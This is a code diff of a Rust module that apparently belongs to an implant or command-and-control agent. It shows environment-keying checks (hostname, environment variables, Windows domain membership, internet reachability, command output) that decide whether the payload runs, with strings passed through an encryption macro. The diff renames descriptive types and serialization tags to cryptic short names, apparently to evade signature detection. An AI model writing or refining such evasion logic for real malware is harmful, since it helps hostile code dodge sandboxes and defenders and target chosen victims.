@@ -1,5 +1,5 @@
 use crate::config::CCC;
-use crate::link::{HTTPLink, Link, LinkFetch};
+use crate::link::{HTTPLink, Lk, LinkFetch};
 
 use gethostname::gethostname;
 use regex::Regex;
@@ -13,31 +13,34 @@ use log::error;
 use log::warn;
 
 #[derive(Serialize, Deserialize, Clone)]
-#[serde(rename = "df")]
-pub enum Defuse {
+pub enum DF {
+    #[serde(rename = "h")]
     Hostname(Hostname),
+    #[serde(rename = "e")]
     Env(Env),
-    DomainJoin(DomainJoin),
-    CheckInternet(CheckInternet),
+    #[serde(rename = "d")]
+    DOJ(DOJ), //DomainJoin
+    CI(CI), //CheckInternet
+    #[serde(rename = "cc")]
     Command(Command),
 }
-impl Defuse {
+impl DF {
     pub fn stop_the_exec(&self, config: &CCC) -> bool {
         match self {
-            Defuse::Hostname(hostname) => hostname.stop_exec(config),
-            Defuse::DomainJoin(domain_join) => domain_join.stop_exec(config),
-            Defuse::CheckInternet(checkinternet) => checkinternet.stop_exec(config),
-            Defuse::Env(env_variable) => env_variable.stop_exec(config),
-            Defuse::Command(comm) => comm.stop_exec(config),
+            DF::Hostname(hostname) => hostname.stop_exec(config),
+            DF::DOJ(domain_join) => domain_join.stop_exec(config),
+            DF::CI(ci) => ci.stop_exec(config),
+            DF::Env(env_variable) => env_variable.stop_exec(config),
+            DF::Command(comm) => comm.stop_exec(config),
         }
     }
     pub fn get_operator(&self) -> Operator {
         match self {
-            Defuse::Hostname(hostname) => hostname.get_operator(),
-            Defuse::DomainJoin(domain_join) => domain_join.get_operator(),
-            Defuse::CheckInternet(checkinternet) => checkinternet.get_operator(),
-            Defuse::Env(env_variable) => env_variable.get_operator(),
-            Defuse::Command(comm) => comm.get_operator(),
+            DF::Hostname(hostname) => hostname.get_operator(),
+            DF::DOJ(domain_join) => domain_join.get_operator(),
+            DF::CI(ci) => ci.get_operator(),
+            DF::Env(env_variable) => env_variable.get_operator(),
+            DF::Command(comm) => comm.get_operator(),
         }
     }
 }
@@ -56,15 +59,15 @@ pub trait DefuseCheck {
 
 #[derive(Serialize, Deserialize, Clone)]
 #[serde(rename = "ci")]
-pub struct CheckInternet {
+pub struct CI { //CI
     pub list: Vec<String>,
     pub operator: Operator,
 }
-impl DefuseCheck for CheckInternet {
+impl DefuseCheck for CI {
     fn stop_exec(&self, config: &CCC) -> bool {
         for url in &self.list {
             debug!("{}{}", encrypt_string!("check internet: "), url);
-            let link: Link = Link::HTTP(HTTPLink {
+            let link: Lk = Lk::HTTP(HTTPLink {
                 url: url.to_string(),
                 dataoperation: vec![],
                 jitt: 0,
@@ -176,13 +179,13 @@ use windows_sys::Win32::{
 };
 
 #[derive(Serialize, Deserialize, Clone)]
-pub struct DomainJoin {
+pub struct DOJ {
     pub list: Vec<String>,
     pub operator: Operator,
 }
 
 #[cfg(target_os = "linux")]
-impl DefuseCheck for DomainJoin {
+impl DefuseCheck for DOJ {
     fn stop_exec(&self, _config: &CCC) -> bool {
         true
     }
@@ -192,7 +195,7 @@ impl DefuseCheck for DomainJoin {
 }
 
 #[cfg(target_os = "windows")]
-impl DefuseCheck for DomainJoin {
+impl DefuseCheck for DOJ {
     fn stop_exec(&self, _config: &CCC) -> bool {
         let mut domain_controller_info: *mut DOMAIN_CONTROLLER_INFOA = std::ptr::null_mut();
         let status = unsafe {
